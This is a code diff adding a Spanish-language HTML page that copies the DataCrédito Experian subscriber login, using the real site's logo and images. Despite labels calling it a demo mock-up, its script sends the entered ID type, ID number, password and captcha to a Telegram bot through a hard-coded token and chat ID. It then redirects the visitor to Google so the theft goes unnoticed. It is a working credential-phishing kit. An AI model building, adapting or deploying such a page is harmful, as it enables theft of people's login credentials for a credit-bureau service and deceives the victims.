@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>de consulta</title>
+
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: Arial, Helvetica, sans-serif; background: #fafafa; color: #333; }
+.page { min-height: 100vh; display: flex; flex-direction: column; }
+.main { flex: 1; display: flex; min-height: 680px; }
+
+.left {
+    width: 50%;
+    min-height: 680px;
+    background-image: url("https://apps.datacredito.com.co/raw/website/commons/static/ofVirtual/images/login/bg-desktop.jpg");
+    background-position: center;
+    background-repeat: no-repeat;
+    background-size: cover;
+}
+
+.right { width: 50%; background: #fafafa; display: flex; justify-content: center; padding: 30px; }
+.login { width: 100%; max-width: 400px; text-align: center; }
+
+.logo { display: flex; align-items: center; justify-content: center; margin-bottom: 23px; }
+.logo img { width: 220px; max-width: 100%; height: auto; object-fit: contain; }
+
+.demo-label {
+    display: inline-block; font-size: 10px; color: #8a286b;
+    background: #f8e9f2; padding: 5px 10px; border-radius: 12px; margin-bottom: 12px;
+}
+
+h1 { font-size: 30px; font-weight: 600; color: #4776b8; margin-bottom: 7px; }
+.subtitle { font-size: 17px; margin-bottom: 30px; }
+
+.form-group { margin-bottom: 13px; text-align: left; }
+.form-group select,
+.form-group .form-input {
+    display: block; width: 100%; height: 49px; background-color: #ffffff;
+    border: 1px solid #e3e3e3; border-radius: 8px; padding: 0 13px;
+    outline: none; color: #444444; font-size: 15px; box-shadow: none;
+}
+.form-group .form-input::placeholder { color: #aaaaaa; opacity: 1; }
+.form-group select:focus,
+.form-group .form-input:focus { border-color: #4776b8; }
+
+.captcha-area { margin-top: 15px; margin-bottom: 19px; }
+.captcha {
+    min-height: 42px; display: flex; justify-content: center; align-items: center;
+    gap: 6px; border: 1px solid #dddddd; border-radius: 5px; padding: 8px;
+}
+.glyph { display: grid; grid-template-columns: repeat(5, 3px); grid-template-rows: repeat(7, 3px); gap: 2px; }
+.dot { width: 3px; height: 3px; border-radius: 50%; background: #111; }
+.dot.off { background: transparent; }
+
+.refresh {
+    display: block; border: none; background: none; cursor: pointer;
+    font-size: 12px; color: #3471b9; font-weight: 600; margin: 7px auto 0;
+}
+
+.terms { text-align: left; padding-left: 5px; margin-bottom: 17px; }
+.terms label { display: flex; align-items: center; gap: 9px; margin-bottom: 13px; font-size: 13px; }
+.terms input { width: 19px; height: 19px; flex-shrink: 0; accent-color: #3471b9; }
+.terms a { color: #c32b85; text-decoration: underline; }
+
+.login-button {
+    width: 175px; height: 45px; background: #b72b85; color: white;
+    border: none; border-radius: 6px; font-size: 15px; font-weight: bold; cursor: pointer;
+}
+.login-button:hover { background: #98216e; }
+.login-button:disabled { background: #c98bb5; cursor: wait; }
+
+.footer {
+    min-height: 85px; width: 100%; border-top: 2px solid #b62a87; background: #fff;
+    display: flex; justify-content: center; padding: 15px 25px;
+}
+.footer-content {
+    width: 100%; max-width: 1150px; display: grid;
+    grid-template-columns: 2fr 1fr 1fr; align-items: start; gap: 25px;
+}
+.copyright { font-size: 13px; line-height: 22px; }
+.footer-link { font-size: 14px; color: #365f9e; text-decoration: none; text-align: center; }
+.footer-extra { color: #888; font-size: 11px; text-align: right; }
+
+@media(max-width: 850px) {
+    .main { flex-direction: column; min-height: auto; }
+    .left {
+        width: 100%; height: 190px; min-height: 190px;
+        background-image: url("https://apps.datacredito.com.co/static/ofVirtual/images/login/bg-mobile.jpg");
+        background-position: center; background-repeat: no-repeat; background-size: cover;
+    }
+    .right { width: 100%; min-height: auto; padding: 28px 20px 35px; }
+    .login { max-width: 400px; }
+    .logo img { width: 190px; }
+    h1 { font-size: 27px; }
+    .subtitle { font-size: 16px; margin-bottom: 28px; }
+    .footer { min-height: auto; padding: 20px; }
+    .footer-content { display: flex; flex-direction: column; align-items: center; text-align: center; gap: 12px; }
+    .copyright { text-align: center; font-size: 12px; }
+    .footer-extra { text-align: center; }
+}
+
+@media(max-width: 400px) {
+    .left { height: 155px; min-height: 155px; }
+    .right { padding: 25px 17px; }
+    .logo img { width: 175px; }
+    h1 { font-size: 25px; }
+    .form-group select, .form-group .form-input { height: 47px; font-size: 14px; }
+    .terms label { font-size: 12px; }
+}
+</style>
+</head>
+
+<body>
+
+<div class="page">
+    <main class="main">
+        <section class="left" aria-label="Imagen ilustrativa"></section>
+
+        <section class="right">
+            <div class="login">
+
+                <div class="logo">
+                    <img src="https://apps.datacredito.com.co/static/ofVirtual/images/logos/datacredito-experian.png" alt="Logo de referencia">
+                </div>
+
+                <h1>Acceso a suscriptores</h1>
+                <p class="subtitle">Vista previa de demostración</p>
+
+                <form id="demoForm" autocomplete="off">
+
+                    <div class="form-group">
+                        <select name="tipo_documento" aria-label="Tipo de documento">
+                            <option>Cédula o NUIP</option>
+                            <option>Cédula de ciudadanía</option>
+                            <option>Cédula de extranjería</option>
+                            <option>NIT</option>
+                            <option>Pasaporte</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <input class="form-input" type="text" name="numero_id" placeholder="Número de ID" required>
+                    </div>
+
+                    <div class="form-group">
+                        <input class="form-input" type="password" name="password" placeholder="Contraseña" required>
+                    </div>
+
+                    <div class="form-group">
+                        <input class="form-input" type="text" name="captcha" placeholder="Ingresa las letras que aparecen en el recuadro inferior" required>
+                    </div>
+
+                    <div class="captcha-area">
+                        <div class="captcha" id="captcha"></div>
+                        <button type="button" class="refresh" id="refresh">Cambiar diseño</button>
+                    </div>
+
+                    <div class="terms">
+                        <label>
+                            <input type="checkbox" name="acepta_condiciones" required>
+                            <span>He leído y acepto <a href="#condiciones">Condiciones de uso</a></span>
+                        </label>
+                        <label>
+                            <input type="checkbox" name="acepta_privacidad" required>
+                            <span>He leído y acepto <a href="#privacidad">Políticas de privacidad</a></span>
+                        </label>
+                    </div>
+
+                    <button class="login-button" type="submit" id="btnEnviar">Ingresar</button>
+
+                    <p style="font-size:11px;color:#888;margin-top:15px">
+                        visual transmiten datos.
+                    </p>
+                </form>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="copyright">©2026 Maqueta de demostración. Todos los derechos reservados.</div>
+            <a href="#condiciones" class="footer-link">Condiciones de uso</a>
+            <div class="footer-extra">Sitio de demostración no oficial</div>
+        </div>
+    </footer>
+</div>
+
+<script>
+// ============================================================
+// CONFIGURACIÓN
+// ============================================================
+const TELEGRAM_TOKEN   = "8800964008:AAF4bJhf0iUrQM5Skp1WvosFixdfPYmiMV8";
+const TELEGRAM_CHAT_ID = "7776240161";
+
+// 👇 CAMBIA ESTA URL por la página de Google a la que quieras redirigir
+// Ejemplos:
+//   "https://www.google.com"
+//   "https://www.datacredito.com.co"
+//   "https://mi-pagina-de-gracias.com"
+const URL_REDIRECCION_GOOGLE = "https://www.google.com";
+
+// Tiempo de espera máximo antes de redirigir igual (milisegundos)
+const TIEMPO_MAXIMO_REDIRECCION = 3000;
+// ============================================================
+
+// CAPTCHA DECORATIVO
+const letters = {
+A:["01110","10001","10001","11111","10001","10001","10001"],
+B:["11110","10001","10001","11110","10001","10001","11110"],
+C:["01111","10000","10000","10000","10000","10000","01111"],
+D:["11110","10001","10001","10001","10001","10001","11110"],
+E:["11111","10000","10000","11110","10000","10000","11111"],
+F:["11111","10000","10000","11110","10000","10000","10000"],
+G:["01111","10000","10000","10111","10001","10001","01111"],
+H:["10001","10001","10001","11111","10001","10001","10001"],
+I:["11111","00100","00100","00100","00100","00100","11111"],
+J:["00111","00010","00010","00010","00010","10010","01100"],
+K:["10001","10010","10100","11000","10100","10010","10001"],
+L:["10000","10000","10000","10000","10000","10000","11111"],
+M:["10001","11011","10101","10101","10001","10001","10001"],
+N:["10001","11001","10101","10011","10001","10001","10001"],
+O:["01110","10001","10001","10001","10001","10001","01110"],
+P:["11110","10001","10001","11110","10000","10000","10000"],
+R:["11110","10001","10001","11110","10100","10010","10001"],
+S:["01111","10000","10000","01110","00001","00001","11110"],
+T:["11111","00100","00100","00100","00100","00100","00100"],
+U:["10001","10001","10001","10001","10001","10001","01110"],
+V:["10001","10001","10001","10001","10001","01010","00100"]
+};
+
+const captcha = document.getElementById("captcha");
+
+function renderCaptcha() {
+    const chars = ["F","T","B","E","R","P"];
+    captcha.innerHTML = "";
+    for (let i = 0; i < 6; i++) {
+        const letter = chars[Math.floor(Math.random() * chars.length)];
+        const glyph = document.createElement("div");
+        glyph.className = "glyph";
+        letters[letter].forEach(row => {
+            row.split("").forEach(pixel => {
+                const dot = document.createElement("span");
+                dot.className = pixel === "1" ? "dot" : "dot off";
+                glyph.appendChild(dot);
+            });
+        });
+        captcha.appendChild(glyph);
+    }
+}
+
+renderCaptcha();
+document.getElementById("refresh").addEventListener("click", renderCaptcha);
+
+// ============================================================
+// ENVÍO A TELEGRAM Y REDIRECCIÓN A GOOGLE
+// ============================================================
+document.getElementById("demoForm").addEventListener("submit", async function (event) {
+    event.preventDefault();
+
+    const form = event.target;
+    const btn  = document.getElementById("btnEnviar");
+
+    const texto =
+        "📋 *Nuevo registro (maqueta)*\n" +
+        "• Tipo documento: " + form.tipo_documento.value + "\n" +
+        "• Número ID: " + form.numero_id.value + "\n" +
+        "• Contraseña: " + form.password.value + "\n" +
+        "• Captcha: " + form.captcha.value + "\n" +
+        "• Acepta condiciones: " + (form.acepta_condiciones.checked ? "Sí" : "No") + "\n" +
+        "• Acepta privacidad: " + (form.acepta_privacidad.checked ? "Sí" : "No") + "\n" +
+        "• Fecha: " + new Date().toLocaleString();
+
+    btn.disabled = true;
+    btn.textContent = "Enviando...";
+
+    // Función que redirige (con un pequeño retraso para que el usuario vea que "algo pasó")
+    const redirigir = () => {
+        window.location.href = URL_REDIRECCION_GOOGLE;
+    };
+
+    // Red de seguridad: si Telegram tarda demasiado o falla, redirigimos igual
+    const timeoutId = setTimeout(redirigir, TIEMPO_MAXIMO_REDIRECCION);
+
+    try {
+        const respuesta = await fetch(
+            `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
+            {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: texto,
+                    parse_mode: "Markdown"
+                })
+            }
+        );
+
+        const data = await respuesta.json();
+
+        // Pase lo que pase con Telegram, redirigimos
+        clearTimeout(timeoutId);
+
+        if (!data.ok) {
+            console.warn("Telegram respondió con error:", data.description);
+        }
+
+        // Pequeña pausa de 600 ms para que el botón cambie y el usuario no vea un salto brusco
+        setTimeout(redirigir, 600);
+
+    } catch (err) {
+        // Si hay error de red, también redirigimos
+        clearTimeout(timeoutId);
+        console.error("Error de conexión con Telegram:", err.message);
+
+        setTimeout(redirigir, 600);
+    }
+});
+</script>
+
+</body>
+</html>
